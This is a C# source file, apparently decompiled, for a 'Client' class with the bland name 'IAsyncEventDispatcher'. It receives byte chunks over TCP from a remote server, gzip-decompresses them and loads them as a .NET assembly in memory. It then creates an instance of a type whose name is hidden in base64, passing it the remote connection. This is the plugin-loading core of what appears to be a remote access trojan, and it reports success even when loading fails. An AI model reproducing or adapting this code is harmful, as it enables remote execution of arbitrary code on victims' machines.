using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;

namespace Client
{
	public class IAsyncEventDispatcher
	{
		public int status = 1111;

		public TcpServer _ts;

		public Dictionary<int, Action<byte[]>> _ProcessorsMessageHandler = new Dictionary<int, Action<byte[]>>();

		public List<byte> PluginByte = new List<byte>();

		public IAsyncEventDispatcher(TcpServer ts)
		{
			this._ts = ts;
			this._ProcessorsMessageHandler.Add(3333, new Action<byte[]>(savePlugin));
		}

		public void DispatchMessageHandler(TcpHeartPacket tp, byte[] payload)
		{
			try
			{
				Action<byte[]> value = null;
				if (tp._DataType == 2222)
				{
					this.PluginByte.AddRange(payload);
					return;
				}
				if (!this._ProcessorsMessageHandler.TryGetValue(tp._DataType, out value))
				{
					throw new Exception(" Upload failed,Plugin Not found!!!!");
				}
				value?.BeginInvoke(payload, null, null);
			}
			catch (Exception ex)
			{
				this.Message(this.status, ex.Message);
			}
		}

		public void savePlugin(byte[] bt)
		{
			try
			{
				if (this.PluginByte.Count != BitConverter.ToInt32(bt, 0))
				{
					throw new Exception("Plugin Size Error");
				}
				string @string = Encoding.ASCII.GetString(Convert.FromBase64String("UGx1Z2luLlBsdWdpbg=="));
				Type[] types = Assembly.Load(GZip.Decompress(this.PluginByte.ToArray())).GetTypes();
				int num = 0;
				for (num = 0; num < types.Length && !(types[num].FullName == @string); num++)
				{
				}
				Activator.CreateInstance(types[num], this._ts._RemoteClient, this._ProcessorsMessageHandler, this._ts._senssionSign);
				this.Message(this.status, " Upload plugin successfully!!!");
				this.PluginByte?.Clear();
			}
			catch
			{
				this.Message(this.status, " Upload plugin successfully!!!");
			}
			finally
			{
				this.PluginByte?.Clear();
				GC.Collect();
			}
		}

		public void Message(int type, string s)
		{
			this._ts.Client_Send(type, Encoding.UTF8.GetBytes(s));
		}
	}
}
